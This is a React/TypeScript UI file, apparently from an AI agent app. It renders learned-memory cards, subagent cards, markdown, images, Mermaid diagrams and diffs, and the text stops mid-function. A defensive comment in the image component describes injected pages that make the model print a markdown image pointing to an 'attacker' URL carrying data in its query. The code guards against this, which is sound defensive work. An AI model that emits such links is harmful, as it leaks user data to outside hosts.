import { Fragment, memo, useCallback, useEffect, useId, useMemo, useRef, useState, type ReactNode } from "react";
import { api, jobsApi, learnApi, type LearnedItem } from "../lib/api";
import { tr, useLang, type Lang } from "../lib/i18n";
import {
  Activity,
  AlertTriangle,
  Bell,
  BookOpen,
  Bot,
  Brain,
  Check,
  ChevronRight,
  Clock,
  Code2,
  Copy,
  Cpu,
  ExternalLink,
  FileDiff,
  FilePen,
  FileText,
  GitBranch,
  Globe,
  Image,
  ImageOff,
  Info,
  ListTodo,
  MessageCircleQuestionMark,
  Network,
  Pencil,
  Search,
  Sparkles,
  Terminal,
  Undo2,
  Webhook,
  Wrench,
  X,
  type LucideIcon,
} from "lucide-react";
import type { Block, ToolRow } from "../lib/turn";
import { ZerithMark } from "./ui";
import { FileLangBadge } from "./FileLangIcon";
import { DiffLines, TurnChanges, rows as diffRows, type Row as DiffRow } from "./Changes";
export { FileLangBadge };
import { highlightCode } from "./highlight";
import {
  hasUnclosedFence,
  parseBlocks,
  parseBlocksCached,
  splitMarkdownChunks,
  splitStableMarkdown,
  type Inline,
  type MdBlock,
} from "./markdown";

function formatLearnedItemText(item: LearnedItem): string {
  if (item.kind === "skill" && item.name) {
    return item.text ? `${item.name}: ${item.text}` : item.name;
  }
  return item.text;
}

/** `/btw`: a pergunta paralela e a resposta, num cartão recolhível que não é
 * mensagem da conversa (nunca volta ao modelo). Aberto quando a resposta chega. */
function BtwNote(props: { btw: NonNullable<Extract<Block, { kind: "note" }>["btw"]> }) {
  const lang = useLang();
  const { question, answer, error, model } = props.btw;
  const [open, setOpen] = useState(true);
  const pending = answer == null && error == null;
  const copyValue = answer ?? error ?? question;
  return (
    <div className={"learned-card btw-card" + (open ? " open" : "")}>
      <div className="learned-head">
        <button
          type="button"
          className="learned-toggle"
          aria-expanded={open}
          onClick={() => setOpen((v) => !v)}
        >
          <MessageCircleQuestionMark size={13} strokeWidth={2} className="learned-icon" aria-hidden />
          <span className="learned-title">{tr(lang, "Pergunta paralela", "Side question")}</span>
          <span className="learned-preview" title={question}>
            {question}
          </span>
        </button>
        <span className="learned-chev" aria-hidden="true" onClick={() => setOpen((v) => !v)}>
          <ChevronRight size={14} strokeWidth={2} className="chev" />
        </span>
      </div>
      {open ? (
        <div className="learned-body btw-body">
          {pending ? (
            <span className="btw-pending">{tr(lang, "pensando…", "thinking…")}</span>
          ) : error != null ? (
            <span className="btw-error">
              {tr(lang, "Não consegui responder: ", "Could not answer: ")}
              {error}
            </span>
          ) : (
            <Markdown text={answer ?? ""} streaming={false} />
          )}
          {!pending ? (
            <div className="btw-foot">
              {model ? (
                <span className="btw-meta">
                  {model} · {tr(lang, "fora da conversa", "off-record")}
                </span>
              ) : (
                <span />
              )}
              <CopyButton text={copyValue} label={tr(lang, "Copiar", "Copy")} />
            </div>
          ) : model ? (
            <span className="btw-meta">
              {model} · {tr(lang, "fora da conversa", "off-record")}
            </span>
          ) : null}
        </div>
      ) : null}
    </div>
  );
}

/** Antigravity-style collapsible card for what the background review saved after a turn. */
function LearnedNote(props: { text: string; items: LearnedItem[] }) {
  const [open, setOpen] = useState(false);
  const [undoneIdx, setUndoneIdx] = useState<Set<number>>(() => new Set());
  const [busyAll, setBusyAll] = useState(false);
  const [busyIdx, setBusyIdx] = useState<Set<number>>(() => new Set());
  const [error, setError] = useState<string | null>(null);

  const total = props.items.length;
  const allUndone = total > 0 && undoneIdx.size >= total;
  const anyBusy = busyAll || busyIdx.size > 0;

  const title = allUndone
    ? "Aprendizado desfeito"
    : total === 1
      ? props.items[0].kind === "skill"
        ? "Skill salva"
        : "Memória salva"
      : `${total} aprendizados salvos`;

  const preview =
    props.items
      .map(formatLearnedItemText)
      .filter(Boolean)
      .join(" · ") || props.text.replace(/^Aprendi:\s*/, "");

  const undoOne = async (idx: number) => {
    if (undoneIdx.has(idx) || anyBusy) return;
    setError(null);
    setBusyIdx((prev) => new Set(prev).add(idx));
    try {
      await learnApi.undo(props.items[idx]);
      setUndoneIdx((prev) => new Set(prev).add(idx));
    } catch (e) {
      setError(e instanceof Error ? e.message : String(e));
    } finally {
      setBusyIdx((prev) => {
        const next = new Set(prev);
        next.delete(idx);
        return next;
      });
    }
  };

  const undoAll = async () => {
    if (allUndone || anyBusy) return;
    const remaining = props.items
      .map((_, idx) => idx)
      .filter((idx) => !undoneIdx.has(idx));
    if (!remaining.length) return;
    setError(null);
    setBusyAll(true);
    const succeeded: number[] = [];
    let firstErr: unknown = null;
    try {
      for (const idx of remaining) {
        try {
          await learnApi.undo(props.items[idx]);
          succeeded.push(idx);
        } catch (err) {
          if (firstErr == null) firstErr = err;
        }
      }
      if (succeeded.length > 0) {
        setUndoneIdx((prev) => {
          const next = new Set(prev);
          for (const idx of succeeded) next.add(idx);
          return next;
        });
      }
      if (firstErr != null) {
        setError(firstErr instanceof Error ? firstErr.message : String(firstErr));
      }
    } finally {
      setBusyAll(false);
    }
  };

  return (
    <div className={"learned-card" + (open ? " open" : "") + (allUndone ? " undone" : "")}>
      <div className="learned-head">
        <button
          type="button"
          className="learned-toggle"
          aria-expanded={open}
          onClick={() => setOpen((v) => !v)}
        >
          <Sparkles size={13} strokeWidth={2} className="learned-icon" aria-hidden />
          <span className="learned-title">{title}</span>
          {preview ? (
            <span className="learned-preview" title={preview}>
              {preview}
            </span>
          ) : null}
        </button>
        {!allUndone ? (
          <button
            type="button"
            className="learned-undo"
            onClick={(e) => {
              e.stopPropagation();
              void undoAll();
            }}
            disabled={anyBusy}
            title={error ?? "Apagar o que foi aprendido neste turno"}
          >
            <Undo2 size={12} strokeWidth={2} aria-hidden />
            <span>Desfazer</span>
          </button>
        ) : null}
        <span
          className="learned-chev"
          aria-hidden="true"
          onClick={() => setOpen((v) => !v)}
        >
          <ChevronRight size={14} strokeWidth={2} className="chev" />
        </span>
      </div>
      {open ? (
        <div className="learned-body">
          {props.items.map((item, idx) => {
            const isUndone = undoneIdx.has(idx);
            const isBusy = busyAll || busyIdx.has(idx);
            const kindLabel = item.kind === "skill" ? "Skill" : "Memória";
            const opLabel =
              item.op === "update" || item.op === "patch" ? ` · ${item.op}` : "";
            const itemText = formatLearnedItemText(item);
            return (
              <div key={idx} className={"learned-item" + (isUndone ? " undone" : "")}>
                <span className="learned-badge">
                  {kindLabel}
                  {opLabel}
                </span>
                <span className={"learned-item-text" + (isUndone ? " undone" : "")}>
                  {itemText}
                </span>
                {isUndone ? (
                  <span className="learned-item-done">Desfeito</span>
                ) : (
                  <button
                    type="button"
                    className="learned-undo"
                    onClick={() => void undoOne(idx)}
                    disabled={isBusy}
                    title="Desfazer este item"
                  >
                    <Undo2 size={12} strokeWidth={2} aria-hidden />
                    <span>Desfazer</span>
                  </button>
                )}
              </div>
            );
          })}
        </div>
      ) : null}
      {error ? (
        <p className="learned-error" role="alert">
          {error}
        </p>
      ) : null}
    </div>
  );
}

const SUBAGENT_STATE_LABEL: Record<string, string> = {
  running: "Executando",
  done: "Concluído",
  failed: "Falhou",
  cancelled: "Cancelado",
};

function shortSubagentModel(raw: string): string {
  const idx = raw.indexOf(":");
  return idx > 0 ? raw.slice(idx + 1) : raw;
}

function splitSubagentName(raw: string): { role: string; title: string } {
  const colon = raw.indexOf(":");
  if (colon <= 0) return { role: "agente", title: raw.trim() };
  return {
    role: raw.slice(0, colon).trim(),
    title: raw.slice(colon + 1).trim(),
  };
}

function SubagentCard({ block }: { block: Extract<Block, { kind: "subagent" }> }) {
  const [open, setOpen] = useState(false);
  const [stopping, setStopping] = useState(false);
  const { role, title } = splitSubagentName(block.name);
  const st =
    block.state === "running" ||
    block.state === "done" ||
    block.state === "failed" ||
    block.state === "cancelled"
      ? block.state
      : "done";
  const hasDetails = block.steps.length > 0 || Boolean(block.summary);
  const modelLabel = block.model ? shortSubagentModel(block.model) : "";
  const statusLabel = SUBAGENT_STATE_LABEL[block.state] ?? block.state;

  return (
    <div className={`subagent-card ${st}` + (open ? " open" : "")}>
      <div className="subagent-row">
        <button
          type="button"
          className="subagent-head"
          disabled={!hasDetails}
          aria-expanded={hasDetails ? open : undefined}
          onClick={() => hasDetails && setOpen((v) => !v)}
        >
          <span className={`subagent-icon ${st}`} aria-hidden>
            {st === "running" ? (
              <span className="spinner" />
            ) : st === "done" ? (
              <Check size={14} strokeWidth={2.25} />
            ) : st === "failed" ? (
              <AlertTriangle size={14} strokeWidth={2} />
            ) : (
              <X size={14} strokeWidth={2.25} />
            )}
          </span>
          <span className="subagent-role">{role}</span>
          <span className="subagent-title" title={title}>
            {title}
          </span>
          {modelLabel ? (
            <span className="subagent-model" title={block.model}>
              {modelLabel}
            </span>
          ) : null}
          <span className={`subagent-status ${st}`}>{statusLabel}</span>
          {hasDetails ? (
            <ChevronRight size={14} strokeWidth={2} className="chev" />
          ) : null}
        </button>
        {st === "running" ? (
          <button
            type="button"
            className="subagent-stop"
            disabled={stopping}
            title="Parar este subagente; o que ele já fez volta para a conversa"
            onClick={() => {
              setStopping(true);
              void jobsApi.stopSubagent(block.id).catch(() => setStopping(false));
            }}
          >
            {stopping ? "Parando..." : "Parar"}
          </button>
        ) : null}
      </div>
      {st === "running" && block.summary && !open ? (
        <div className="subagent-live">{block.summary}</div>
      ) : null}
      {open && hasDetails ? (
        <div className="subagent-body">
          {block.steps.length > 0 ? (
            <>
              <ul className="subagent-steps">
                {block.steps.map((s, idx) => (
                  <li key={idx}>
                    <Markdown text={s} streaming={false} />
                  </li>
                ))}
              </ul>
              {block.summary &&
              block.summary.trim() !==
                block.steps[block.steps.length - 1]?.trim() ? (
                <Markdown className="subagent-summary" text={block.summary} streaming={false} />
              ) : null}
            </>
          ) : (
            <Markdown className="subagent-summary" text={block.summary ?? ""} streaming={false} />
          )}
        </div>
      ) : null}
    </div>
  );
}

const isWeb = (src: string) => /^(https?:|data:)/i.test(src);
const USER_IMG = /^!\[([^\]\n]*)\]\(<([^>\n]+)>\)\s*$/gm;

/** Full-window view of one image; Esc or a click outside closes it. */
function Lightbox({ src, url, alt, onClose }: { src: string; url: string; alt: string; onClose: () => void }) {
  const root = useRef<HTMLDivElement>(null);
  const closeBtn = useRef<HTMLButtonElement>(null);
  useEffect(() => {
    const back = document.activeElement as HTMLElement | null;
    closeBtn.current?.focus();
    return () => back?.focus?.();
  }, []);
  useEffect(() => {
    const onKey = (e: KeyboardEvent) => {
      if (e.key === "Escape") return onClose();
      if (e.key !== "Tab" || !root.current) return;
      // Keep Tab inside the dialog.
      const items = [...root.current.querySelectorAll<HTMLElement>("button")];
      if (!items.length) return;
      const first = items[0];
      const last = items[items.length - 1];
      const at = document.activeElement;
      if (e.shiftKey && (at === first || !root.current.contains(at))) {
        e.preventDefault();
        last.focus();
      } else if (!e.shiftKey && (at === last || !root.current.contains(at))) {
        e.preventDefault();
        first.focus();
      }
    };
    window.addEventListener("keydown", onKey);
    return () => window.removeEventListener("keydown", onKey);
  }, [onClose]);
  const isHttp = /^https?:/i.test(src);
  const canOpenExternally = isHttp || !isWeb(src);
  const open = () => (isHttp ? void api.openUrl(src) : void api.openImage(src));
  return (
    <div ref={root} className="lightbox" role="dialog" aria-modal="true" aria-label={alt || "Imagem"} onClick={onClose}>
      <img src={url} alt={alt} onClick={(e) => e.stopPropagation()} />
      <div className="lightbox-bar" onClick={(e) => e.stopPropagation()}>
        <span className="lightbox-name">{alt || (src.startsWith("data:") ? "Imagem" : src.split(/[\\/]/).pop())}</span>
        {canOpenExternally ? (
          <button className="btn btn-sm" onClick={open}>
            <ExternalLink size={14} strokeWidth={2} />
            Abrir fora
          </button>
        ) : null}
        <button ref={closeBtn} className="icon-btn sm" onClick={onClose} aria-label="Fechar" title="Fechar (Esc)">
          <X size={16} strokeWidth={2} />
        </button>
      </div>
    </div>
  );
}

/** `![alt](src)`: web and data URLs load directly; a local path is read
 * through the core, which only hands back image files. */
function MdImage({ src, alt }: { src: string; alt: string }) {
  // A page the model read can make it print `![](https://attacker/x?d=...)`:
  // loading that by itself is a zero-click ping (or a leak in the query). A
  // remote image therefore waits for the click; local files and data: URLs
  // load as before. UNC / protocol-relative paths are always rejected.
  const blockedUnc = src.startsWith("//") || src.startsWith("\\\\") || src.startsWith("/\\");
  const remote = /^https?:/i.test(src);
  const [allowed, setAllowed] = useState(!remote);
  const [url, setUrl] = useState<string | null>(isWeb(src) && !remote ? src : null);
  const [failed, setFailed] = useState<string | null>(blockedUnc ? "caminho UNC recusado" : null);
  const [zoom, setZoom] = useState(false);
  useEffect(() => {
    setAllowed(!remote);
    setUrl(isWeb(src) && !remote ? src : null);
    setFailed(blockedUnc ? "caminho UNC recusado" : null);
    setZoom(false);
  }, [src, remote, blockedUnc]);
  useEffect(() => {
    if (blockedUnc) return;
    if (remote) {
      if (!allowed) return;
      setUrl(src);
      return;
    }
    if (isWeb(src)) return;
    let live = true;
    api
      .readImage(src)
      .then((u) => live && setUrl(u))
      .catch((e) => live && setFailed(String(e)));
    return () => {
      live = false;
    };
  }, [src, remote, allowed, blockedUnc]);
  if (failed) {
    return (
      <span className="md-img-fail" title={failed}>
        <ImageOff size={14} strokeWidth={2} />
        {alt || src}
      </span>
    );
  }
  if (!allowed) {
    let host = src;
    try {
      host = new URL(src).host;
    } catch {
      /* keep the raw text */
    }
    return (
      <button
        type="button"
        className="md-img-pending"
        onClick={() => setAllowed(true)}
        title={src}
      >
        <ImageOff size={14} strokeWidth={2} aria-hidden />
        <span>Imagem de {host}</span>
        <span className="md-img-load">Carregar</span>
      </button>
    );
  }
  if (!url) return <span className="md-img loading" aria-label="Carregando imagem" />;
  if (url.startsWith("data:video/") || /\.(mp4|m4v|webm|mov)$/i.test(src)) {
    return <video className="md-video" src={url} controls preload="metadata" aria-label={alt || "Vídeo"} />;
  }
  return (
    <>
      <button className="md-img" onClick={() => setZoom(true)} title={alt || "Ampliar"}>
        <img src={url} alt={alt} loading="lazy" onError={() => setFailed("não carregou")} />
      </button>
      {zoom ? <Lightbox src={src} url={url} alt={alt} onClose={() => setZoom(false)} /> : null}
    </>
  );
}

// First match wins, so web_search is a Globe before "search" makes it a lens,
// and task_* maps to ListTodo before /agent|task|delegate/.
const TOOL_ICONS: [RegExp, LucideIcon][] = [
  [/^skill/, BookOpen],
  [/^task_|todo/, ListTodo],
  [/^memory/, Brain],
  [/^net_diff$/, FileDiff],
  [/^net_snmp$/, Activity],
  [/^net_api$/, Webhook],
  [/^net_zabbix$/, Bell],
  [/^net_/, Network],
  [/^execute_code$/, Code2],
  [/^view_image$/, Image],
  [/^sleep$/, Clock],
  [/^process$/, Cpu],
  [/web|fetch|http|url|browse/, Globe],
  [/bash|shell|exec|command|terminal_|powershell|remote_shell|monitor/, Terminal],
  [/grep|glob|search|find|repo_map/, Search],
  [/write|edit|patch|replace|create/, FilePen],
  [/read|view|cat|list_dir|lsp|diagnostics/, FileText],
  [/agent|task|delegate/, Bot],
];

/** The icon a tool row (and the approval card) shows for a tool name. */
export function toolIcon(name: string): LucideIcon {
  const n = name.toLowerCase();
  return TOOL_ICONS.find(([re]) => re.test(n))?.[1] ?? Wrench;
}

const ARG_KEYS = [
  "pattern",
  "query",
  "symbol",
  "path",
  "file_path",
  "filePath",
  "command",
  "cmd",
  "url",
  "glob",
  "description",
  "prompt",
  "name",
  "action",
  "host",
  "target",
];

function parseArgs(args: string): unknown {
  try {
    return JSON.parse(args);
  } catch {
    return null;
  }
}

/** The one argument worth reading in a collapsed row: the path, the command… */
function argSummaryFromParsed(parsed: unknown, args: string): string {
  const v = parsed as Record<string, unknown> | null;
  if (v && typeof v === "object") {
    const key = ARG_KEYS.find((k) => typeof v[k] === "string");
    const first = key ? v[key] : Object.values(v).find((x) => typeof x === "string");
    return typeof first === "string" ? first.replace(/\s+/g, " ") : "";
  }
  return args.replace(/\s+/g, " ");
}

function CopyButton({ text, label }: { text: string; label?: string }) {
  const [done, setDone] = useState(false);
  const copy = () =>
    void navigator.clipboard
      ?.writeText(text)
      .then(() => {
        setDone(true);
        setTimeout(() => setDone(false), 1400);
      })
      .catch(() => undefined);
  const name = done ? "Copiado" : (label ?? "Copiar");
  return (
    <button className={"copy-btn" + (done ? " done" : "")} onClick={copy} aria-label={name} title={name}>
      {done ? <Check size={14} strokeWidth={2} /> : <Copy size={14} strokeWidth={2} />}
      {label ? <span>{name}</span> : null}
    </button>
  );
}

function inlines(nodes: Inline[]): ReactNode[] {
  return nodes.map((n, i) => {
    if (typeof n === "string") {
      if (!n.includes("\n")) return n;
      return <Fragment key={i}>{n.split("\n").map((s, j) => (j ? [<br key={j} />, s] : s))}</Fragment>;
    }
    if (n.t === "code") return <code key={i}>{n.v}</code>;
    if (n.t === "img") return <MdImage key={i} src={n.src} alt={n.alt} />;
    if (n.t === "a") {
      return (
        <a key={i} href={n.href} target="_blank" rel="noreferrer noopener">
          {inlines(n.c)}
        </a>
      );
    }
    const Tag = n.t === "b" ? "strong" : n.t === "i" ? "em" : "s";
    return <Tag key={i}>{inlines(n.c)}</Tag>;
  });
}

export const HighlightedCode = memo(function HighlightedCode({
  lang,
  text,
}: {
  lang: string;
  text: string;
}) {
  const tokens = useMemo(() => highlightCode(lang, text), [lang, text]);
  return (
    <>
      {tokens.map((t, idx) =>
        t.cls ? (
          <span key={idx} className={t.cls}>
            {t.text}
          </span>
        ) : (
          <Fragment key={idx}>{t.text}</Fragment>
        ),
      )}
    </>
  );
});

type GraphNode = { id: string; label: string; layer: number; row: number };
type GraphEdge = { from: string; to: string; label: string };

function parseMermaidGraph(src: string): { nodes: GraphNode[]; edges: GraphEdge[] } | null {
  const nodesMap = new Map<string, string>();
  const edges: GraphEdge[] = [];
  const cleanLabel = (raw: string) =>
    raw
      .trim()
      .replace(/^["'[(]+|["'\])]+$/g, "")
      .replace(/\\n/g, " · ");

  const parseEndpoint = (token: string): string => {
    const t = token.trim();
    const m = /^([A-Za-z0-9_.-]+)\s*(?:\[([^\]]+)\]|"([^"]+)"|\(([^)]+)\)|\{([^}]+)\})?/.exec(t);
    if (!m) return t;
    const id = m[1];
    const lbl = m[2] || m[3] || m[4] || m[5];
    if (lbl && !nodesMap.has(id)) {
      nodesMap.set(id, cleanLabel(lbl));
    } else if (!nodesMap.has(id)) {
      nodesMap.set(id, id);
    }
    return id;
  };

  for (const rawLine of src.split("\n")) {
    const line = rawLine.trim();
    if (
      !line ||
      line.startsWith("%%") ||
      /^(graph|flowchart|subgraph|end|style|classDef|class|direction)\b/i.test(line)
    ) {
      continue;
    }
    const edgeMatch =
      /^(.+?)\s*(?:-->|---|==>|-\.->)\s*(?:\|([^|]+)\|\s*)?(.+)$/.exec(line) ||
      /^(.+?)\s*--\s*([^-|>]+?)\s*-->\s*(.+)$/.exec(line);
    if (edgeMatch) {
      const from = parseEndpoint(edgeMatch[1]);
      const edgeLabel = (edgeMatch[2] ?? "").trim();
      const to = parseEndpoint(edgeMatch[3]);
      if (from && to) {
        edges.push({ from, to, label: edgeLabel });
      }
    }
  }

  if (nodesMap.size < 2 || edges.length === 0) return null;

  const inDegree = new Map<string, number>();
  const adj = new Map<string, string[]>();
  for (const id of nodesMap.keys()) {
    inDegree.set(id, 0);
    adj.set(id, []);
  }
  for (const e of edges) {
    inDegree.set(e.to, (inDegree.get(e.to) ?? 0) + 1);
    adj.get(e.from)?.push(e.to);
  }

  const layerMap = new Map<string, number>();
  const queue: string[] = [];
  for (const [id, deg] of inDegree.entries()) {
    if (deg === 0) {
      layerMap.set(id, 0);
      queue.push(id);
    }
  }
  if (queue.length === 0) {
    const first = nodesMap.keys().next().value;
    if (first) {
      layerMap.set(first, 0);
      queue.push(first);
    }
  }
  while (queue.length > 0) {
    const cur = queue.shift()!;
    const curLayer = layerMap.get(cur) ?? 0;
    for (const nxt of adj.get(cur) ?? []) {
      if (!layerMap.has(nxt)) {
        layerMap.set(nxt, Math.min(curLayer + 1, 8));
        queue.push(nxt);
      }
    }
  }
  for (const id of nodesMap.keys()) {
    if (!layerMap.has(id)) layerMap.set(id, 0);
  }

  const byLayer = new Map<number, string[]>();
  for (const [id, l] of layerMap.entries()) {
    const arr = byLayer.get(l) ?? [];
    arr.push(id);
    byLayer.set(l, arr);
  }

  const nodes: GraphNode[] = [];
  for (const [layer, ids] of byLayer.entries()) {
    ids.forEach((id, row) => {
      nodes.push({
        id,
        label: nodesMap.get(id) ?? id,
        layer,
        row,
      });
    });
  }
  return { nodes, edges };
}

function MermaidDiagramBlock({ lang, text }: { lang: string; text: string }) {
  const markerId = `mermaid-arrow-${useId().replace(/[^a-zA-Z0-9_-]/g, "")}`;
  const graph = useMemo(() => parseMermaidGraph(text), [text]);
  const [userView, setUserView] = useState<"diagram" | "code" | null>(null);
  const view = userView ?? (graph ? "diagram" : "code");

  if (!graph) {
    return (
      <div className="md-code">
        <div className="md-code-bar">
          <span>{lang || "mermaid"}</span>
          <CopyButton text={text} label="Copiar" />
        </div>
        <pre>
          <code>
            <HighlightedCode lang={lang} text={text} />
          </code>
        </pre>
      </div>
    );
  }

  const maxLayer = Math.max(...graph.nodes.map((n) => n.layer), 0);
  const maxRow = Math.max(...graph.nodes.map((n) => n.row), 0);
  const colW = 210;
  const rowH = 74;
  const nodeW = 164;
  const nodeH = 42;
  const padX = 28;
  const padY = 24;
  const width = Math.max(420, (maxLayer + 1) * colW + padX * 2);
  const height = Math.max(130, (maxRow + 1) * rowH + padY * 2);
  const pos = new Map<string, { x: number; y: number }>();
  for (const n of graph.nodes) {
    pos.set(n.id, {
      x: padX + n.layer * colW,
      y: padY + n.row * rowH,
    });
  }

  return (
    <div className="md-code">
      <div className="md-code-bar">
        <span>{lang} · topologia</span>
        <div style={{ display: "flex", gap: 6, alignItems: "center" }}>
          <button
            type="button"
            className="copy-btn"
            onClick={() => setUserView(view === "diagram" ? "code" : "diagram")}
          >
            <span>{view === "diagram" ? "Ver código" : "Ver diagrama"}</span>
          </button>
          <CopyButton text={text} label="Copiar" />
        </div>
      </div>
      {view === "diagram" ? (
        <div style={{ overflowX: "auto", padding: "12px 8px" }}>
          <svg
            width={width}
            height={height}
            viewBox={`0 0 ${width} ${height}`}
            role="img"
            aria-label="Diagrama de topologia Mermaid"
          >
            <defs>
              <marker
                id={markerId}
                viewBox="0 0 10 10"
                refX="9"
                refY="5"
                markerWidth="6"
                markerHeight="6"
                orient="auto-start-reverse"
              >
                <path d="M 0 1 L 10 5 L 0 9 z" fill="currentColor" opacity="0.65" />
              </marker>
            </defs>
            {graph.edges.map((e, idx) => {
              const p1 = pos.get(e.from);
              const p2 = pos.get(e.to);
              if (!p1 || !p2) return null;
              const x1 = p1.x + nodeW;
              const y1 = p1.y + nodeH / 2;
              const x2 = p2.x;
              const y2 = p2.y + nodeH / 2;
              const mx = (x1 + x2) / 2;
              const my = (y1 + y2) / 2 - 6;
              return (
                <g key={idx}>
                  <line
                    x1={x1}
                    y1={y1}
                    x2={x2}
                    y2={y2}
                    stroke="currentColor"
                    strokeOpacity="0.45"
                    strokeWidth="1.5"
                    markerEnd={`url(#${markerId})`}
                  />
                  {e.label ? (
                    <text
                      x={mx}
                      y={my}
                      textAnchor="middle"
                      fontSize="10"
                      fill="currentColor"
                      opacity="0.8"
                    >
                      {e.label.slice(0, 22)}
                    </text>
                  ) : null}
                </g>
              );
            })}
            {graph.nodes.map((n) => {
              const p = pos.get(n.id)!;
              return (
                <g key={n.id} transform={`translate(${p.x},${p.y})`}>
                  <rect
                    width={nodeW}
                    height={nodeH}
                    rx="8"
                    fill="var(--layer-2)"
                    stroke="currentColor"
                    strokeOpacity="0.35"
                    strokeWidth="1.25"
                  />
                  <text
                    x={nodeW / 2}
                    y={nodeH / 2 + 4}
                    textAnchor="middle"
                    fontSize="11.5"
                    fontWeight="600"
                    fill="currentColor"
                  >
                    {n.label.length > 22 ? n.label.slice(0, 20) + "…" : n.label}
                  </text>
                </g>
              );
            })}
          </svg>
        </div>
      ) : (
        <pre>
          <code>
            <HighlightedCode lang={lang} text={text} />
          </code>
        </pre>
      )}
    </div>
  );
}

function blocks(list: MdBlock[], deferLastCode = false): ReactNode[] {
  return list.map((b, i) => {
    const isLast = i === list.length - 1;
    switch (b.t) {
      case "h": {
        const Tag = `h${Math.min(b.level, 4)}` as "h1" | "h2" | "h3" | "h4";
        return <Tag key={i}>{inlines(b.c)}</Tag>;
      }
      case "p":
        return <p key={i}>{inlines(b.c)}</p>;
      case "list": {
        const items = b.items.map((it, j) => (
          <li key={j}>{blocks(it, deferLastCode && isLast && j === b.items.length - 1)}</li>
        ));
        return b.ordered ? (
          <ol key={i} start={b.start}>
            {items}
          </ol>
        ) : (
          <ul key={i}>{items}</ul>
        );
      }
      case "code": {
        const skipHighlight = deferLastCode && isLast;
        if (!skipHighlight && /^(mermaid|topology)$/i.test(b.lang.trim())) {
          return <MermaidDiagramBlock key={i} lang={b.lang} text={b.text} />;
        }
        return (
          <div key={i} className="md-code">
            <div className="md-code-bar">
              <span>{b.lang || "texto"}</span>
              <CopyButton text={b.text} label="Copiar" />
            </div>
            <pre>
              <code>
                {skipHighlight ? b.text : <HighlightedCode lang={b.lang} text={b.text} />}
              </code>
            </pre>
          </div>
        );
      }
      case "quote":
        return <blockquote key={i}>{blocks(b.c, deferLastCode && isLast)}</blockquote>;
      case "table":
        return (
          <div key={i} className="md-table">
            <table>
              <thead>
                <tr>
                  {b.head.map((c, k) => (
                    <th key={k} style={{ textAlign: b.align[k] ?? undefined }}>
                      {inlines(c)}
                    </th>
                  ))}
                </tr>
              </thead>
              <tbody>
                {b.rows.map((r, j) => (
                  <tr key={j}>
                    {r.map((c, k) => (
                      <td key={k} style={{ textAlign: b.align[k] ?? undefined }}>
                        {inlines(c)}
                      </td>
                    ))}
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        );
      case "hr":
        return <hr key={i} />;
    }
  });
}

const StableMarkdownChunk = memo(function StableMarkdownChunk({ text }: { text: string }) {
  const tree = useMemo(() => parseBlocksCached(text), [text]);
  return <>{blocks(tree)}</>;
});

const StableMarkdown = memo(function StableMarkdown({ text }: { text: string }) {
  const chunks = useMemo(() => splitMarkdownChunks(text), [text]);
  return (
    <>
      {chunks.map((chunk, idx) => (
        <StableMarkdownChunk key={idx} text={chunk} />
      ))}
    </>
  );
});

function Markdown({ text, streaming, className }: { text: string; streaming: boolean; className?: string }) {
  const { stable, tail } = useMemo(
    () => (streaming ? splitStableMarkdown(text) : { stable: text, tail: "" }),
    [text, streaming],
  );
  const tailTree = useMemo(
    () => (tail ? parseBlocks(tail) : []),
    [tail],
  );
  const deferTailCode = useMemo(
    () => Boolean(streaming && tail && hasUnclosedFence(tail)),
    [streaming, tail],
  );
  return (
    <div className={"md" + (streaming ? " streaming" : "") + (className ? " " + className : "")}>
      {stable ? <StableMarkdown text={stable} /> : null}
      {tailTree.length ? blocks(tailTree, deferTailCode) : null}
    </div>
  );
}

const STATE_LABEL = { run: "executando", ok: "concluída", fail: "falhou" } as const;

const SHELL_TOOLS = new Set([
  "shell",
  "bash",
  "powershell",
  "remote_shell",
  "monitor",
  "terminal_send",
  "terminal_open",
  "terminal_batch",
  "net_connect",
  "net_broadcast",
]);
const isShellTool = (name: string) => SHELL_TOOLS.has(name);
const EDIT_TOOLS = new Set(["edit_file", "write_file", "multi_edit", "apply_patch"]);
const READ_TOOLS = new Set(["read_file", "grep", "glob"]);
const BATCH_TOOLS = new Set(["terminal_batch", "net_broadcast"]);
const BURST_READ_TOOLS = new Set([
  "read_file",
  "grep",
  "glob",
  "list_dir",
  "repo_map",
  "lsp",
  "lsp_definition",
  "lsp_references",
  "lsp_hover",
  "lsp_symbols",
  "lsp_implementation",
  "lsp_rename",
  "diagnostics",
  "view_image",
]);
// ponytail: teto de linhas do diff montado dos argumentos; um write_file enorme
// mostra só o começo (a caixa já rola). Subir se fizer falta.
const MAX_DIFF_ROWS = 400;
const DIFF_CTX_LINES = 3;

/** O comando de uma chamada de shell/terminal: `command`, `input` ou a lista do lote. */
function commandOf(a: Record<string, unknown> | null): string | null {
  if (!a) return null;
  for (const k of ["command", "cmd", "input"]) {
    const v = a[k];
    if (typeof v === "string" && v.trim()) return v.replace(/\n+$/, "");
  }
  if (Array.isArray(a.commands)) {
    const list = a.commands
      .map((c: unknown) =>
        typeof c === "string"
          ? c
          : c && typeof c === "object" && typeof (c as { cmd?: unknown }).cmd === "string"
            ? (c as { cmd: string }).cmd
            : "",
      )
      .filter(Boolean);
    if (list.length) return list.join("\n");
  }
  return null;
}

const textLines = (s: string) => s.replace(/\n$/, "").split("\n");

/** Real line-level diff using common prefix/suffix trimming + Myers/LCS DP on the changed window. */
function computeLineDiff(oldLines: string[], newLines: string[]): DiffRow[] {
  if (oldLines.length === 0) return newLines.map((text) => ({ kind: "add", text }));
  if (newLines.length === 0) return oldLines.map((text) => ({ kind: "del", text }));

  let prefix = 0;
  const minLen = Math.min(oldLines.length, newLines.length);
  while (prefix < minLen && oldLines[prefix] === newLines[prefix]) prefix += 1;

  let suffix = 0;
  while (
    suffix < minLen - prefix &&
    oldLines[oldLines.length - 1 - suffix] === newLines[newLines.length - 1 - suffix]
  ) {
    suffix += 1;
  }

  const out: DiffRow[] = [];
  if (prefix > 0) {
    const ctxStart = Math.max(0, prefix - DIFF_CTX_LINES);
    if (ctxStart > 0) out.push({ kind: "hunk", text: `… ${ctxStart} linha(s) acima` });
    for (let i = ctxStart; i < prefix; i++) out.push({ kind: "ctx", text: oldLines[i] });
  }

  const oldMid = oldLines.slice(prefix, oldLines.length - suffix);
  const newMid = newLines.slice(prefix, newLines.length - suffix);
  const m = oldMid.length;
  const n = newMid.length;

  if (m === 0) {
    for (const text of newMid) out.push({ kind: "add", text });
  } else if (n === 0) {
    for (const text of oldMid) out.push({ kind: "del", text });
  } else if (m * n <= 40_000) {
    const cols = n + 1;
